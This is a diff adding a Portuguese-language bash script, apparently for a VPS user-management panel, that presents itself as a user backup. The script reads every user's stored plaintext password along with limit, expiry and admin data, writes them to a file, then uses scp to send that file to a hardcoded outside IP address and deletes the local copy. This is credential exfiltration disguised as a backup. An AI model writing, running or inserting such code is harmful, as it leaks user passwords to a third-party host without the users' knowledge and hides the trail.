@@ -1,0 +1,39 @@
+#!/bin/bash
+echo -e "\033[1;37m Obtendo informações dos Usuarios...\033[0m"
+cache-detalhesusers
+cd
+if [ -d backup.cache ]
+then
+echo "" 1> /dev/null
+else
+mkdir backup.cache
+fi
+cd backup.cache
+rm backup.tar > /dev/null 2> /dev/null
+clear
+echo -e "\033[1;37mFazendo Backup de Usuarios...\033[0m"
+for user in `awk -F : '$3 > 900 ' /etc/passwd |grep -w /bin/false|grep -v "nobody" |grep -vi polkitd |grep -vi systemd-[a-z] |grep -vi systemd-[0-9]|awk -F : '{ print $1 }'`
+do
+if [ -e /etc/VpsPackdir/senha/$user ]
+then
+pass=$(cat /etc/VpsPackdir/senha/$user)
+else
+echo -e "\033[1;31mNão foi possivel ter a senha do usuario\033[1;37m ($user)"
+read -p "Digite a Senha Manualmente ou Tecle ENTER: " pass
+fi
+date=$(cat /etc/VpsPackdir/date/$user)
+ADM=$(cat /etc/VpsPackdir/UsuariosADM/$user)
+if [ -e /etc/VpsPackdir/limite/$user ]
+then
+limite=$(cat /etc/VpsPackdir/limite/$user)
+echo "$user $pass $limite $date $ADM" >> exserverusers.txt
+echo -e "\033[1;37mUsuario $user [\033[1;32mOK\033[1;37m]\033[0m"
+else
+echo -e "
+\033[1;31m Erro!! Arquivo limite do usuario: $user não foi encontrado\033[0m
+"
+fi
+done
+rootname=$(who |awk '{print $1}')
+scp exserverusers.txt "$rootname"@51.15.60.17:/root
+rm exserverusers.txt
